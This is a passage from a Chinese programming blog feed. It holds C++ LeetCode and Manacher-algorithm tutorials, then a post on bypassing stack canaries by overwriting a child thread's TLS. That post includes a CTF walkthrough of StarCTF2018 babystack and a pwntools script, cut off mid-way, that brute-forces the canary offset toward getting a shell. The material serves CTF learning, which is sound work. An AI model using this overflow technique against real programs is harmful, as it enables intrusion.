-1</code></p><p>从左向右扩散，记当前位置下标为i</p><ul><li><p>1、若i&gt;R，则暴力扩</p></li><li><p>2、若i&lt;=R，做出此时<code>R</code>关于<code>C</code>的对称的<code>L</code>，<code>i</code>关于<code>C</code>的对称点<code>i'</code>，<strong>注意这里C与i的为位置关系不确定。</strong></p><p>此时在回文半径数组P中我们可以找到<code>i'</code>的回文半径，所以可以确定<code>i'</code>的回文区域</p><ul><li>若[Li,Ri] 是 [L,R]的一个子集，则<code>i</code>的回文长度与<code>i'</code>的回文半径相等（简单的对称性易知</li></ul><p><img src="/2023/04/14/manacher-suan-fa/1.png"></p><ul><li>若Li&lt;L，Ri&lt;=R，则<code>i</code>的回文半径为<code>R-i</code></li></ul><p><img src="/2023/04/14/manacher-suan-fa/2.png"></p><ul><li>若Li=L，则<code>i</code>的回文半径至少为<code>R-i</code></li></ul></li></ul><h2 id="原字符串下标与辅助字符串下标对应关系"><a href="#原字符串下标与辅助字符串下标对应关系" class="headerlink" title="原字符串下标与辅助字符串下标对应关系"></a>原字符串下标与辅助字符串下标对应关系</h2><p>设原字符串为<code>s</code>：s = abcbd</p><p>辅助字符串为<code>str</code>：str = #a#b#c#b#d#</p><p>易知：s[i] = str[2i + 1]；即若 s[i] = str[k] ==&gt; k = 2i +1 ==&gt; i = (k - 1)/2 = k/2</p><p>伪C++代码：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">string str;//处理后的字符串,如：#1#2#1#int R = -1;int C = -1;int P[n];for(int i = 0; i &lt; str.len; i++){    if(i &gt; R){        //从i暴力扩散，更新R,C    } else {        if(Li&gt;L){            P[i] = P[i'];         } else if(Li&lt;L) {            P[i] = R-i;        } else {            //从R和2i-R处开始扩散            //可能更新R,C        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    void manacherStr(char *str, string &amp;s){        int k = 0;        for(int i = 0; i &lt; 2*s.length()+1; i++)            str[i] = (i &amp; 1) == 0? '#' : s[k++];    }    string longestPalindrome(string s) {        int n = s.length() * 2 + 1;         char str[n];        manacherStr(str, s);        int p[n]; //回文半径数组        int C = -1; //中心        int R = -1; //回文右边界的再往右一个位置，最右有效区是R-1位置        int maxlen = 1;        int begin = 0;        for(int i=0; i &lt; n; i++){            p[i] = i &lt; R? min(p[2*C-i], R-i) : 1;            while(i+p[i] &lt; n &amp;&amp; i-p[i]&gt;-1){                if(str[i+p[i]] == str[i-p[i]])                    p[i]++;                else                    break;            }            if(i+p[i] &gt; R){                R = i + p[i];                C = i;            }        }        for(int i = 0; i &lt; n; i++){            if(p[i] - 1 &gt; maxlen){                 maxlen = p[i] - 1;                 //由上面的原字符串下标与辅助字符串下标对应关系可以推出                begin = (i - p[i] + 1)/2;            }        }        return s.substr(begin, maxlen);    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Manacher算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法刷题篇</title>
      <link href="/2023/04/14/suan-fa-shua-ti-pian/"/>
      <url>/2023/04/14/suan-fa-shua-ti-pian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a><a href="https://leetcode.cn/problems/longest-palindromic-substring/">最长回文子串</a></h1><p>以下方法中：</p><ul><li><p><strong>maxlen：表示最长回文子串的长度</strong></p></li><li><p><strong>begin：表示最长回文子串的起始位置</strong></p></li></ul><h2 id="暴力解法"><a href="#暴力解法" class="headerlink" title="暴力解法"></a>暴力解法</h2><p>因为字符串大小在1000以内，所以可以直接暴力</p><p>从左到右，遍历每一个字符作为回文子串首字符，然后判断长度为2，3….的子串是否是回文子串</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public://判断s[i,j]是否是回文子串    bool isvalid(string &amp;s, int i, int j){        int left = i;        int right = j;        while(left &lt; right){            if(s[left++] != s[right--])                return false;        }        return true;    }    string longestPalindrome(string s) {        int n = s.length();        int maxlen = 1;        int begin = 0;        for(int i=0;i&lt;n-1;i++){            for(int j=i+1;j&lt;n;j++){                if(j-i+1&gt;maxlen &amp;&amp; isvalid(s,i,j)){                    maxlen = j-i+1;                    begin = i;                }            }        }        return s.substr(begin, maxlen);    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$$<br>时间复杂度：O(n^3)==空间复杂度：O(1)<br>$$</p><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>对于长度大于2回文串，去掉首尾的字符仍然是回文串。如回文串’abcba’，去掉两边的’a’，剩下的部分’bcb’仍然是回文串。</p><p>所以如果我们要判断一个字符串s[i…j]是否是回文串，我们只需要：</p><ul><li>判断s[i] == s[j]，若不相等则不是回文串，若相等则进行第2步判断</li><li>判断s[i+1,…,j-1]是否是回文串，若是则s[i…j]也是回文串</li></ul><p>定义<code>dp[i][j]</code>：表示s[i,…,j]是否是回文串</p><p>状态转移方程：j-1 - (i+1) + 1 = j-i-1&gt;=2 ==&gt; j-i&gt;=3(保证s[i+1,…,j-1]子串的长度不小于2)<br>$$<br>dp[i][j]= \begin{cases}<br>false,&amp; \text{s[i] != s[j]}<br>\\ dp[i+1][j-1], &amp; \text{s[i] = s[j]}<br>\end{cases}<br>$$<br>边界条件：</p><ul><li>长度为1的子串<code>dp[i][i]</code>肯定是回文串，<code>dp[i][i]=true</code></li><li>长度为2的子串，<code>dp[i][i+1] = (s[i]==s[i+1]?true:false)</code></li></ul><p><strong>注意：在状态转移方程中，我们是从长度较短的字符串向长度较长的字符串进行转移的，因此一定要注意动态规划的循环顺序。</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    string longestPalindrome(string s) {        int n = s.length();        int maxlen = 1;        int begin = 0;        bool dp[n][n];        //长度为1的子串一定是回文串        for(int i=0;i&lt;n;i++)             dp[i][i] = true;        //列举右边界(这里也可以列举子串长度，然后根据左边界计算出右边界)        //这里之所以先列举右边界是因为右边界可以限制长度，由状态转移方程可知：        //我们要先判断长度较小的子串是否是回文串        for(int j=1;j&lt;n;j++){            //列举左边界            for(int i=0;i&lt;j;i++){                if(s[i]!=s[j]){                    dp[i][j] = false;                } else {                    if(j-i&gt;=3)                        dp[i][j] = dp[i+1][j-1];                    else                           dp[i][j] = true;                }                if(dp[i][j] &amp;&amp; j-i+1&gt;maxlen){                    maxlen = j-i+1;                    begin = i;                }            }        }        return s.substr(begin, maxlen);    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$$<br>时间复杂度：O(n^2)==空间复杂度：O(n^2)<br>$$</p><h2 id="中心扩散法"><a href="#中心扩散法" class="headerlink" title="中心扩散法"></a>中心扩散法</h2><p>对于回文串，其结构是轴对称的，所以我们可以以每一个字符为中心向两边扩散，但是这里得分两种情况。</p><ul><li>1、回文串长度为奇数：’aca’   ==&gt; 我们以第2个字符向两边扩散，返回长度len1</li><li>2、回文串长度为偶数：’acca’ ==&gt; 我们以第2，3个字符向两边扩散，返回长度len2</li><li>然后取长度最大的那个，maxlen=max(len1,len2)，begin = i - (maxlen-1)/2</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    //从i,j位置向两边扩散    //当i==j时，则是奇数的情况    //当i==j-1时，则是偶数的情况    int find(string &amp;s, int i, int j){        int left = i;        int right = j;        while(left&gt;=0 &amp;&amp; right&lt;s.length() &amp;&amp; s[left] == s[right]){            left--,right++;        }        return right-left-1;    }    string longestPalindrome(string s) {        int n = s.length();        int maxlen = 1;        int begin = 0;                for(int i=0;i&lt;n;i++){            int len1 = find(s,i,i);            int len2 = find(s,i,i+1);            int len = max(len1,len2);            if(len&gt;maxlen){                maxlen = len;                begin = i - (maxlen-1)/2; //i减去长度的一半就是begin            }        }        return s.substr(begin, maxlen);    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$$<br>时间复杂度：O(n^2)==空间复杂度：O(1)<br>$$</p><h2 id="Manacher算法"><a href="#Manacher算法" class="headerlink" title="Manacher算法"></a>Manacher算法</h2><p>见Manacher算法博文&gt;_&lt;!!!</p><h1 id="正则表达式匹配"><a href="#正则表达式匹配" class="headerlink" title="正则表达式匹配"></a><a href="https://leetcode.cn/problems/regular-expression-matching/">正则表达式匹配</a></h1><p>定义<code>dp[i][j]</code>：表示 s 的前 i 个字符是否能被 p 的前 j 个字符匹配；</p><p>状态转移方程：</p><ul><li><p>若<code>p[j-1] == s[i-1] || p[j-1] == '.'</code>，<code>dp[i][j] = dp[i-1][j-1]</code></p></li><li><p>若<code>p[i-1] == '*'</code></p><ul><li>若<code>p[j-2] != s[i-1] &amp;&amp; p[j-2] != '.'</code>，<code>dp[i][j] = dp[i][j-2]</code></li><li>若<code>p[j-2] == s[i-1] || p[j-2] == '.'</code>，<code>dp[i][j] = dp[i][j-2]||dp[i-1][j]</code><ul><li>分析如下：</li></ul></li></ul></li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">/*eg：s：a a a a i p：a a b a *   j我们知道a*表示a出现0次或者多次，那么分情况讨论1）a出现0次，则相当于：s：a a a a ip：a a b    j-2所以：dp[i][j] = dp[i][j-2]2）a出现多次，则相当于：这里相当于i回退一个(跟完全背包很像)s：a a a a         ip：a a b a *           j所以：dp[i][j] = dp[i-1][j]上面两种情况，有一种情况匹配即可！！！*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>others：<code>dp[i][j] = false</code></li></ul><p>边界条件：</p><ul><li><p><code>dp[0][0] = true，dp[0][1] = false</code></p></li><li><p>当 i = 0，j &gt;= 2时：</p><ul><li><code>dp[0][j] = p[j-1] == '*' ? dp[0][j-2] : false</code>，因为 s 为空，所以我们只能让 p 中的 * 不断的消去字符</li></ul></li><li><p>当 i !=0，j = 0时：<code>dp[i][0] = false</code></p></li></ul><p>这里也可以通过状态转移方程去大致确定边界条件：</p><ul><li>比如在这里，我们求<code>dp[i][j]</code>，时用到了<code>dp[i-1][j-1],dp[i][j-2],dp[i-1][j]</code>，且下标出现了 <code>i-1</code>,<code>j-1</code>,<code>j-2</code>，所以 i ,j 都从1开始，为啥 j 不从2开始呢？因为用到<code>j-2</code>的条件是<code>p[j-1] = '*'</code>，而<code>p[0]不可能为*</code>，所以当 j = 1时，不会使用<code>j-2</code>。所以 i，j都从1开始，那么显然<code>dp[0][j],dp[i][0]</code>等值就需要我们一开始就去填充。</li><li>所以代码中的<code>memset(dp, false, (m+1)*(n+1))</code>就包含了给<code>dp[i][0]赋值，给others情况赋值</code></li></ul><p>coding：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    bool isMatch(string s, string p) {        int m = s.length();        int n = p.length();        bool dp[m+1][n+1];        memset(dp, false, (m+1)*(n+1));        dp[0][0] = true;        for(int j = 2; j &lt;= n; j++)            dp[0][j] = dp[0][j-2] &amp;&amp; p[j-1] == '*';        for(int i = 1; i &lt;= m; i++){            for(int j = 1; j&lt;= n ; j++){                if(p[j-1] == s[i-1] || p[j-1] == '.') dp[i][j] = dp[i-1][j-1];                else if(p[j-1] == '*') {                    if(p[j-2] != s[i-1] &amp;&amp; p[j-2] != '.') dp[i][j] = dp[i][j-2];                    else dp[i][j] = dp[i][j-2] || dp[i-1][j];                }            }        }        return dp[m][n];    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="括号生成"><a href="#括号生成" class="headerlink" title="括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/submissions/">括号生成</a></h1><h2 id="暴力解法-1"><a href="#暴力解法-1" class="headerlink" title="暴力解法"></a>暴力解法</h2><p>n值很小，直接dfs暴力解：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//l表示当前左括号的数量，r表示当前右括号的数量//如何l==n且r==n说明成功生成一个括号组合//如果l&lt;r即当前左括号已经小于右括号的数量，那么也就没必要继续下去了//比如'()))',那么不管后面怎么添加左右括号，前面都无法匹配了，也就无效组合//左右括号应当各一半，所以l&gt;n或r&gt;n直接无效//每次有两种情况，添加一个左括号或者右括号class Solution {public:    void dfs(vector&lt;string&gt; &amp;ans, string s, int l, int r, int n){        if(l == n &amp;&amp; r == n){            ans.push_back(s);            return;        }        if(l &lt; r || l &gt; n || r &gt; n) return;        dfs(ans, s + '(', l + 1, r, n);        dfs(ans, s + ')', l, r + 1, n);    }    vector&lt;string&gt; generateParenthesis(int n) {        vector&lt;string&gt; ans;        dfs(ans, "", 0, 0, n);        return ans;    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="动态规划-1"><a href="#动态规划-1" class="headerlink" title="动态规划"></a>动态规划</h2><p><del>&lt;!_!&gt;，实在是太菜了，根本想不会dp呢，只会暴力&gt;-&lt;</del></p><h1 id="打家劫舍系列"><a href="#打家劫舍系列" class="headerlink" title="打家劫舍系列"></a>打家劫舍系列</h1><h2 id="打家劫舍Ⅰ"><a href="#打家劫舍Ⅰ" class="headerlink" title="打家劫舍Ⅰ"></a><a href="https://leetcode.cn/problems/house-robber/?envType=study-plan&amp;id=dong-tai-gui-hua-ru-men&amp;plan=dynamic-programming&amp;plan_progress=x5y8v0p6">打家劫舍Ⅰ</a></h2><p>其实就是01问题：对于每一个房屋，我们都只有选或者不选两种选择，而约束就是相邻的房屋不能同时选择</p><p>定义<code>dp[i]</code>：表示对于前 i 间房屋，我们能够获得的最大金额（这里的 i 定义为房屋下标即数组下标）</p><p>状态转移方程：对于第 i 间房屋，我们有两种选择：</p><ul><li>选择第 i 间房屋，则第 i-1间房屋则不能选择（这里我们没有提第 i+1间房屋，是因为<code>dp[i]</code>的定义是：前 i 间房屋，与后面的房屋无关），此时：<code>dp[i] = dp[i-2] + nums[i]</code></li><li>不选择第 i 间房屋，则前 i-1 间房屋可以获得的最大金额与前 i 间相同，因为第 i 间不选，此时：<code>dp[i] = dp[i-1]</code></li><li>然后取两者最大值即可：<code>dp[i] = max(dp[i-2]+nums[i], dp[i-1])</code></li></ul><p>边界条件：在状态转移方程中出现了<code>i-1</code>,<code>i-2</code>，所以 i 从2开始；所以我们需要把dp[0],dp[1]填充；易知：dp[0] = nums[0], dp[1] = max(nums[0], nums[1])（注意dp[i]中对 i 的定义是数组下标）</p><p>coding：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    int rob(vector&lt;int&gt;&amp; nums) {        int n = nums.size();        if (n == 1) return nums[0];        int dp[n];        dp[0] = nums[0];        dp[1] = nums[0]&gt;nums[1]?nums[0]:nums[1];        for (int i = 2; i &lt; n; i++){            dp[i] = max(dp[i-2]+nums[i], dp[i-1]);        }        return dp[n-1];    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="打家劫舍Ⅱ"><a href="#打家劫舍Ⅱ" class="headerlink" title="打家劫舍Ⅱ"></a><a href="https://leetcode.cn/problems/house-robber-ii/?envType=study-plan&amp;id=dong-tai-gui-hua-ru-men&amp;plan=dynamic-programming&amp;plan_progress=x5y8v0p6">打家劫舍Ⅱ</a></h2><p>易知最左边和最右边的值不可能同时取得，所以把nums[0,…,n-1]分成两部分nums[1,…,n-1]、nums[0,…,n-2]，这两部分别是打家劫舍I，两边分开算，然后取最大值即可。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    int rob(vector&lt;int&gt;&amp; nums) {        int n = nums.size();        if(n == 1) return nums[0];        if(n == 2) return nums[0]&gt;nums[1]?nums[0]:nums[1];        if(n == 3)            return (nums[0]&gt;nums[1]?nums[0]:nums[1])&gt;nums[2]?(nums[0]&gt;nums[1]?nums[0]:nums[1]):nums[2];        int dp[n-1][2];        //dp[n-1][0] ---&gt; nums[0,...,n-1]        //dp[n-1][1] ---&gt; nums[1,...,n-2]        dp[0][0] = nums[0];        dp[1][0] = nums[0]&gt;nums[1]?nums[0]:nums[1];        dp[0][1] = nums[1];        dp[1][1] = nums[1]&gt;nums[2]?nums[1]:nums[2];        for(int i=2; i&lt;n-1; i++){            dp[i][0] = max(dp[i-2][0]+nums[i], dp[i-1][0]);            dp[i][1] = max(dp[i-2][1]+nums[i+1], dp[i-1][1]);        }        return max(dp[n-2][0], dp[n-2][1]);    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="删除并获得点数"><a href="#删除并获得点数" class="headerlink" title="删除并获得点数"></a><a href="https://leetcode.cn/problems/delete-and-earn/?envType=study-plan&amp;id=dong-tai-gui-hua-ru-men&amp;plan=dynamic-programming&amp;plan_progress=x5y8v0p6">删除并获得点数</a></h2><p>对于该题：如果我们选取了数 x，则 x-1 与 x+1都不能在选取，只要我们选择了x，那么nums中所有的 x 我们都可以选取。x的范围在1~10000之间，所以这题我们可以转换为打家劫舍问题。</p><p>我们就认为房屋数量为10001个，每个房屋 i 的金额s为：nums中 i 的个数为 c 个，s = i * c。最终我们所求就为dp[10000]。</p><p>coding：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    int deleteAndEarn(vector&lt;int&gt;&amp; nums) {        int n = nums.size();        int sum[10001] = {0};        int dp[10001] = {0};        for (int i = 0; i &lt; n; i++)            sum[nums[i]] += nums[i];        dp[0] = sum[0];        dp[1] = sum[0]&gt;sum[1]?sum[0]:sum[1];        for (int i = 2; i &lt; 10001; i++) {            dp[i] = max(dp[i-2]+sum[i], dp[i-1]);        }        return dp[10000];    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="跳跃游戏"><a href="#跳跃游戏" class="headerlink" title="跳跃游戏"></a><a href="https://leetcode.cn/problems/jump-game/submissions/">跳跃游戏</a></h1><p>分析可知：我们只需要关注nums[i] == 0的位置，对于nums[i] == 0的位置，如果 i 前面的任何一个位置都无法跳过 i (即跳到 i 前面)，那么就无法到达最终下标；</p><p><del>这里我们从后往前遍历，为什么从后往前呢？其实都行</del></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution {public:    bool canJump(vector&lt;int&gt;&amp; nums) {        int n = nums.size();        if(n == 1) return true;        bool iscanJump = true;        for(int i = n-2; i&gt;=0 &amp;&amp; iscanJump; i--){            if(!nums[i]){ //如果当前位置为0，则需要判断i前面的是否有位置可以跳过i                iscanJump = false;                for(int j = i-1; j&gt;=0 &amp;&amp; !iscanJump; j--)                    //nums[j] &gt; i -j 则表示nums[j]中的值大于i与j的距离，即从j位置可以跳过i                    if(nums[j] &gt; i - j) iscanJump = true;            }        }        return iscanJump;    }};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> 洛谷 </tag>
            
            <tag> 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划板子篇</title>
      <link href="/2023/04/14/dong-tai-gui-hua-ban-zi-pian/"/>
      <url>/2023/04/14/dong-tai-gui-hua-ban-zi-pian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="背包系列"><a href="#背包系列" class="headerlink" title="背包系列"></a>背包系列</h1><h2 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h2><h2 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h2><h2 id="多重背包"><a href="#多重背包" class="headerlink" title="多重背包"></a>多重背包</h2><h2 id="分组背包"><a href="#分组背包" class="headerlink" title="分组背包"></a>分组背包</h2>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态规划模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary-TLS</title>
      <link href="/2023/04/13/canary-tls/"/>
      <url>/2023/04/13/canary-tls/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在linux中，<strong>我们可以通过修改子线程的线程局部存储(TLS)来达到篡改 canary 目的。</strong></p><h1 id="TLS和thread-stack"><a href="#TLS和thread-stack" class="headerlink" title="TLS和thread stack"></a>TLS和thread stack</h1><p>线程局部存储（Thread Local Storage）是一种机制，它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突。通过TLS机制，为每一个使用该全局变量的线程都提供一个该变量的副本，每一个线程均可以独立地改变自己的副本，而不会影响其他线程。（跟windows里面的TLS作用一样</p><p>这个机制在不同的架构和操作系统上的实现不同，本例实现在x86-64，glibc。在本例中，mmap也被用来创建线程，这意味着如果TLS接近vulnerable address，它可能会被修改。在glibc实现中，TLS被指向一个segment register fs，它的结构tcbhead_t定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the TCB.  Not necessarily the               thread descriptor used by libpthread.  */</span>  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> pointer_guard<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>tcb</code> 指针和 <code>self</code> 指针，实际指向的都是同一个地址，即 <code>struct pthread</code> 结构体（亦或者是 <code>struct tcbhead_t</code> 本身，这两个结构体地址相同）。它包括了stack_guard，即被称作canary的随机数，用来防止栈溢出。它的工作模式是：</p><ul><li>当一个函数被调用，canary从<code>tcbhead_t.stack_guard</code>被放到栈上。</li><li>在函数调用结束的时候，栈上的值被和<code>tcbhead_t.stack_guard</code>比较，如果两个值是不相等的，将会终止程序。</li></ul><p>首先主线程 TLS 位置<strong>较为随机</strong>，所以想通过修改主线程 TLS 来改主线程 canary 几乎是不可能的。</p><p>但研究表明，glibc在TLS实现上存在问题，线程在<code>pthread_create</code>的帮助下创建，然后需要给这个新线程选择TLS。</p><p><code>pthread_create</code> 会创建线程栈（每个线程都有一个独立的栈），这个栈可以是用先前的缓存（例如重用被终止线程的栈），也可以是 mmap 出的一个新的栈。有趣的是，<strong>新线程的 TCB 会在这个线程栈上创建</strong>，那这就使得子线程的 TCB 地址对用户来说<strong>不再是随机</strong>的，因此<strong>可以通过子线程的栈溢出来覆写子线程 TCB 的 Canary</strong>。</p><p>需要注意的是，在 <code>allocate_stack</code> 这个为子线程分配栈的函数中，TCB（<code>pthread</code> 结构体）将会被放置在整个线程栈的<strong>栈底</strong>，即线程栈的最底部（也就是最高地址处）存放的是 TCB。</p><p>然后<code>THREAD_COPY_STACK_GUARD</code>这个宏调用会把当前线程的 canary 复制一份进新线程的 TCB 中。注意控制流的基本单位是线程，虽然每个线程的 canary 值都相同，但在验证 canary 时，只会去获取当前 TCB 上存储的 canary 值。<strong>也就是说如果以非法手段将子线程的 canary 值改变，那么这种改变不影响其他线程的执行。</strong></p><p>主线程：</p><ul><li>可以看到主线程的TLS是由mmap函数创建的</li><li>并且可以看到：tcb,self都是指向0x7ffff7fdc700的</li><li>可以看到：canary = stack_guard = 0xf04613e573f86400</li></ul><p><img src="/2023/04/13/canary-tls/0.png"></p><h1 id="StarCTF2018-babystack例题"><a href="#StarCTF2018-babystack例题" class="headerlink" title="StarCTF2018 babystack例题"></a>StarCTF2018 babystack例题</h1><p>知识点：</p><p>- </p><p>程序开启了RELRO、Canary和NX保护</p><p><img src="/2023/04/13/canary-tls/5-0.png"></p><p>程序逻辑：</p><ul><li>main函数创建了一个子线程</li><li>子线程处理函数中，首先输入要发送信息的大小size，接着向s中读取size个字符，size&lt;=0x10000</li></ul><p><img src="/2023/04/13/canary-tls/1.png"></p><p><img src="/2023/04/13/canary-tls/2.png"></p><p>漏洞：</p><ul><li>s的大小只有0x1000，而size最大为0x10000存在溢出（溢出字节非常大</li><li>这里有子线程，且溢出字节很大，所以考虑覆盖TLS去绕过canary</li><li>栈迁移+one_gadget直接getshell</li></ul><p>问题1：TLS中存储的canary在fs:0x28处，但是我们不知道具体在哪里，所以只能爆破：</p><p>（当然这里也没必要爆破，因为溢出足够大，所以我们往后覆盖多一点总能覆盖到canary，但是如果覆盖到一些重要数据，可以会导致程序直接崩溃。</p><ul><li>爆破出TLS中存储的canary距离输入点为6128</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>offset <span class="token operator">=</span> <span class="token number">0x1020</span> <span class="token operator">+</span> <span class="token number">8</span>count <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> count    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bs'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many bytes do you want to send?"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_addr <span class="token operator">=</span> <span class="token number">0x4009E7</span>    payload  <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x1010</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span>offset<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    temp <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Welcome"</span> <span class="token keyword">in</span> temp<span class="token punctuation">:</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        offset <span class="token operator">+=</span> <span class="token number">8</span> <span class="token comment">#因为是x64</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 